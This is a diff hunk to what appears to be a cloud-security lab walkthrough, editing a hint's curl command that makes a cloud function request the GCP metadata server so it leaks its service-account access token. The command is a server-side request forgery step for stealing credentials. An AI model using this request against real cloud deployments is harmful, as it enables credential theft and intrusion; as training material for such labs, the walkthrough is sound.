@@ -275,7 +275,7 @@ That last access scope looks promising.
 
     You can pass the URL to the metadata server to the function and have it call it.  
     This way, you can make it leak its access token.  
-    `curl -H "Authorization:Bearer $(gcloud auth print-identity-token)" -d '{"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"} -H "Metadata-Flavor: Google" https://<function-endpoint>`  
+    `curl -H "Authorization:Bearer $(gcloud auth print-identity-token)" -d '{"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"} https://<function-endpoint>`  
 
 </details>
 
